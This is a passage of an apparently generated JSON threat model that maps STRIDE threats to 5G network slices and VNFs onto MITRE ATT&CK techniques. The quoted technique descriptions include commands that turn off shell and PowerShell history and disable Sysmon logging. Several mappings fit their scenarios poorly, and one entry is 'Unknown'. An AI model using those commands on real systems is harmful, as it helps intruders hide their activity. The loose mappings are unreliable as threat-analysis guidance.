                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Modification of network slice configurations by malicious insiders.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls for network slice configurations.",
                    "Role": "Network Administrator",
                    "Condition": "Access rights are not regularly audited."
                },
                {
                    "Assumption": "Lack of integrity checks for configuration files",
                    "Role": "System Administrator",
                    "Condition": "No hash-based verification implemented."
                },
                {
                    "Assumption": "Weak or no logging of changes to configurations",
                    "Role": "Auditor",
                    "Condition": "Logs are not enabled or reviewed actively."
                }
            ],
            "Potential Impact": "Corruption of network configurations, leading to service disruptions or unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "configuration manipulation",
                "insider threat",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Injection of malicious code into VNFs through compromised update mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "Update mechanisms are not secured",
                    "Role": "System Developer",
                    "Condition": "Updates are delivered without encryption or digital signatures."
                },
                {
                    "Assumption": "Lack of whitelisting for update sources",
                    "Role": "Security Engineer",
                    "Condition": "No whitelisting mechanisms are in use."
                },
                {
                    "Assumption": "Insufficient integrity checks for software updates",
                    "Role": "System Administrator",
                    "Condition": "Updates are not verified after download."
                }
            ],
            "Potential Impact": "Introduction of vulnerabilities or backdoors in VNFs, potential unauthorized access or disruption of services.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "update mechanism",
                "malware"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Alteration of orchestration and management commands by intercepting communications.",
            "Assumptions": [
                {
                    "Assumption": "Communications are not encrypted",
                    "Role": "Network Architect",
                    "Condition": "Communication channels lack encryption protocols."
                },
                {
                    "Assumption": "Lack of secure key management",
                    "Role": "Encryption Key Manager",
                    "Condition": "Keys are stored insecurely or not rotated regularly."
                },
                {
                    "Assumption": "Insufficient monitoring of orchestration commands",
                    "Role": "SOC Analyst",
                    "Condition": "Commands are not logged or reviewed."
                }
            ],
            "Potential Impact": "Unauthorized changes leading to potential service impact and security breaches.",
            "MITRE ATT&CK Keywords": [
                "command alteration",
                "man-in-the-middle",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Admins deny making specific configuration changes in network slices.",
            "Assumptions": [
                {
                    "Assumption": "No non-repudiation mechanisms in place",
                    "Role": "Security Architect",
                    "Condition": "Systems lack digital signatures or logging with integrity verification."
                },
                {
                    "Assumption": "Logs can be modified without detection",
                    "Role": "System Administrator",
                    "Condition": "Logs are stored without integrity protection."
                },
                {
                    "Assumption": "Lack of dual control or approval processes",
                    "Role": "Operations Manager",
                    "Condition": "Configuration changes are not subject to approval by multiple parties."
                }
            ],
            "Potential Impact": "Difficulty in tracking changes, potential cover-up of malicious activities.",
            "MITRE ATT&CK Keywords": [
                "non-repudiation",
                "log integrity",
                "configuration"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny access attempts to VNFs despite logs showing access.",
            "Assumptions": [
                {
                    "Assumption": "Logs do not include user-specific identifiers",
                    "Role": "System Developer",
                    "Condition": "Authentication logs lack detailed user information."
                },
                {
                    "Assumption": "Log integrity is not protected",
                    "Role": "System Administrator",
                    "Condition": "Logs can be altered without detection."
                },
                {
                    "Assumption": "No out-of-band verification of critical access",
                    "Role": "Security Operations Center (SOC)",
                    "Condition": "Critical access is not verified through secondary channels."
                }
            ],
            "Potential Impact": "Challenge in validating true user actions, potential unauthorized activities escaping detection.",
            "MITRE ATT&CK Keywords": [
                "access control",
                "log alteration",
                "user identification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--85a5a8cd-ff39-4c5e-9085-4295f812d7fa",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Malicious activities by external interfaces cannot be traced back to specific actors.",
            "Assumptions": [
                {
                    "Assumption": "External interface access logs are insufficient",
                    "Role": "Network Engineer",
                    "Condition": "Incomplete or inaccurate logging of external interface access."
                },
                {
                    "Assumption": "No IP address binding or verification",
                    "Role": "Security Analyst",
                    "Condition": "IP addresses of external interfaces are not authenticated or verified."
                },
                {
                    "Assumption": "Absence of forensic readiness",
                    "Role": "Forensic Investigator",
                    "Condition": "Systems are not prepared to capture and preserve logs for forensic analysis."
                }
            ],
            "Potential Impact": "Lack of accountability, potential evasion of detection for malicious activities.",
            "MITRE ATT&CK Keywords": [
                "interface access",
                "activity logging",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data leaks from network slices due to weak encryption.",
            "Assumptions": [
                {
                    "Assumption": "Data-in-transit encryption is weak or outdated",
                    "Role": "Network Engineer",
                    "Condition": "Encryption protocols in use are deprecated or vulnerable."
                },
                {
                    "Assumption": "Unencrypted backups of sensitive data",
                    "Role": "System Administrator",
                    "Condition": "Sensitive data backups are not encrypted."
                },
                {
                    "Assumption": "Data access monitoring is insufficient",
                    "Role": "Security Operations Center (SOC)",
                    "Condition": "Access to sensitive data is not being tracked or monitored."
                }
            ],
            "Potential Impact": "Exposure of sensitive or proprietary information to unauthorized parties.",
            "MITRE ATT&CK Keywords": [
                "data leakage",
                "encryption weakness",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive VNF data via compromised user accounts.",
            "Assumptions": [
                {
                    "Assumption": "User credentials are compromised",
                    "Role": "End User",
                    "Condition": "Users fall victim to phishing or credential stuffing attacks."
                },
                {
                    "Assumption": "No multi-factor authentication",
                    "Role": "Access Control Manager",
                    "Condition": "Accounts are protected only by passwords."
                },
                {
                    "Assumption": "Weak access control policies",
                    "Role": "System Administrator",
                    "Condition": "Permissions are granted more broadly than necessary."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive VNF data, loss of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "user compromise",
                "data access",
                "multi-factor authentication"
            ],
            "mitre_technique": {
                "name": "Gather Victim Identity Information",
                "description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse 2023) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                "id": "attack-pattern--5282dd9a-d26d-4e16-88b7-7c0f4553daf4",
                "technique_id": "T1589"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data exposure through unsecured external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces lack encryption",
                    "Role": "Network Engineer",
                    "Condition": "Data transmission through external interfaces is unencrypted."
                },
                {
                    "Assumption": "Poor security policies for external connections",
                    "Role": "Security Policy Manager",
                    "Condition": "External connection policies are not enforced or updated."
                },
                {
                    "Assumption": "Inadequate logging of data transfers",
                    "Role": "SOC Analyst",
                    "Condition": "Transfers through external interfaces are not logged or monitored."
                }
            ],
            "Potential Impact": "Sensitive data intercepted by unauthorized parties, potential information breaches.",
            "MITRE ATT&CK Keywords": [
                "external interface",
                "data transmission",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack targeting VNFs, overwhelming the system resources.",
            "Assumptions": [
                {
                    "Assumption": "Lack of traffic filtering mechanisms",
                    "Role": "Network Administrator",
                    "Condition": "Traffic management protocols are not in place."
                },
                {
                    "Assumption": "Insufficient resource scaling capabilities",
                    "Role": "System Architect",
                    "Condition": "No dynamic scaling to handle traffic spikes."
                },
                {
                    "Assumption": "Absence of Anti-DDoS measures",
                    "Role": "Security Engineer",
                    "Condition": "Anti-DDoS solutions are not implemented."
                }
            ],
            "Potential Impact": "Disruption of VNF services, impacting system availability.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "system overload",
                "traffic management"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exhaustion of orchestration resources via hostile requests.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting on API requests",
                    "Role": "System Developer",
                    "Condition": "APIs do not enforce request rate limits."
                },
                {
                    "Assumption": "Inadequate validation of API requests",
                    "Role": "API Gateway Manager",
                    "Condition": "APIs lack thorough request validation mechanisms."
                },
                {
                    "Assumption": "Lack of resource throttling policies",
                    "Role": "Orchestration Engineer",
                    "Condition": "Resources are not managed to prevent exhaustion."
                }
            ],
            "Potential Impact": "Orchestration and management services become unavailable, affecting the entire network slice operation.",
            "MITRE ATT&CK Keywords": [
                "API abuse",
                "orchestration",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Blocking access to essential services by network slice misconfiguration.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate review of configuration changes",
                    "Role": "Change Manager",
                    "Condition": "Configuration changes are implemented without proper review."
                },
                {
                    "Assumption": "Lack of rollback mechanisms for configurations",
                    "Role": "System Administrator",
                    "Condition": "Configuration management lacks rollback options."
                },
                {
                    "Assumption": "Insufficient validation of configurations",
                    "Role": "Quality Assurance",
                    "Condition": "Configurations are not tested for impact."
                }
            ],
            "Potential Impact": "Interruption of network services, impacting overall system availability.",
            "MITRE ATT&CK Keywords": [
                "misconfiguration",
                "service disruption",
                "network slice"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Privilege escalation due to vulnerable VNFs allowing unauthenticated actions.",
            "Assumptions": [
                {
                    "Assumption": "Presence of software vulnerabilities in VNFs",
                    "Role": "Software Developer",
                    "Condition": "VNFs are not regularly patched or updated."
                },
                {
                    "Assumption": "No principle of least privilege implemented",
                    "Role": "Access Control Manager",
                    "Condition": "Users have more privileges than necessary."
                },
                {
                    "Assumption": "Lack of security monitoring for privilege escalation",
                    "Role": "SOC Analyst",
                    "Condition": "Privilege escalations are not detected or logged."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive functions, potential breach of critical systems.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerable software",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromised orchestration credentials granting elevated access to network management.",
            "Assumptions": [
                {
                    "Assumption": "Weak credentials for orchestration functions",
                    "Role": "Administrator",
                    "Condition": "Passwords are weak and not regularly updated."
                },
                {
                    "Assumption": "No multi-factor authentication for privileged accounts",
                    "Role": "System Administrator",
                    "Condition": "Accounts rely solely on passwords."
                },
                {
                    "Assumption": "Absence of detailed access logs for elevated actions",
                    "Role": "SOC Analyst",
                    "Condition": "Access logs are not detailed or regularly reviewed."
                }
            ],
            "Potential Impact": "Unauthorized changes to network configurations, potential system-wide disruptions.",
            "MITRE ATT&CK Keywords": [
                "credential compromise",
                "network management",
                "elevated access"
            ],
            "mitre_technique": {
                "name": "Temporary Elevated Cloud Access",
